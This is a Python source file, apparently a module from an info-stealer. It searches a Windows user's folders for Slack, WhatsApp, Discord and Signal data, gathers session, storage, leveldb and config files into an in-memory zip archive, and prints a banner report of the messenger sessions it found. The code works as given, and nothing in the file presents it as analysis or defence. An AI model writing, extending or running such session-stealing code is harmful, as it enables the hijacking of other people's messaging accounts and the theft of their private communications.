import os
import shutil
import zipfile
import io

def grab_messengers():
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    
    messenger_paths = {
        "Slack": os.path.join(roaming, "Slack"),
        "WhatsApp": os.path.join(local, "WhatsApp"),
        "Discord_Local": os.path.join(local, "Discord"),
        "Signal": os.path.join(roaming, "Signal")
    }
    
    session_files = []
    
    for name, path in messenger_paths.items():
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if any(x in file.lower() for x in ['session', 'storage', 'leveldb', 'config.json', 'settings']):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 5 * 1024 * 1024:
                                arcname = os.path.join(name, os.path.relpath(file_path, path))
                                session_files.append((arcname, file_path))
                        except: pass
                if root.count(os.sep) - path.count(os.sep) > 2:
                    break
                    
    if not session_files:
        return None
        
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for arcname, full_path in session_files:
                try:
                    zipf.write(full_path, arcname=arcname)
                except: pass
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None

def get_messenger_report():
    roaming = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')
    found = []
    
    paths = {
        "Slack": os.path.join(roaming, "Slack"),
        "WhatsApp": os.path.join(local, "WhatsApp"),
        "Discord": os.path.join(roaming, "discord"),
        "Signal": os.path.join(roaming, "Signal")
    }
    
    for name, path in paths.items():
        if os.path.exists(path):
            found.append(name)
            
    if not found: return "No messenger apps found."
    
    report = "╔════════════════════════════════════════╗\n"
    report += "║           MESSENGER SESSIONS           ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for app in found:
        report += f"║ FOUND: {app.ljust(31)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
